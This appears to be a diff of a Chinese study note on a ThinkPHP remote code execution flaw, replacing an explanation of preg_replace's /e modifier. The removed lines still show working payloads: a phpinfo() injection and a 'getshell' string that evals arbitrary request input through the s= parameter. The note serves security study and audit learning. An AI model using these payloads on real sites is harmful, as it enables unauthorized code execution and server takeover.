@@ -37,17 +37,22 @@ id: thinkphp框架
 
 [PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com)](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md)
 
-payload：
 
-```
-/index.php?s=/index/index/name/${phpinfo()}
-```
 
-getshell：
+俺的理解：
 
-```
-/index.php?s=/index/index/name/${eval($_REQUEST[8])}&&8=phpinfo();
-```
+1、preg_replace — 执行正则表达式的搜索和替换
+
+> ```php
+>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit ] )
+> # 在 subject 中搜索 pattern 模式的匹配项并替换为 replacement 。
+> # 如果指定了 limit ，则仅替换 limit 个匹配，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换。
+> ```
+> 
+> 而/e修正符会让preg_replace()将replacement参数当作php代码执行
+>(当然要确保replacement构成合法的php代码字符串，否则会PHP会报告在包含 preg_replace() 的行中出现语法解析错误)
+
+2、表达式反向引用
 
 
 
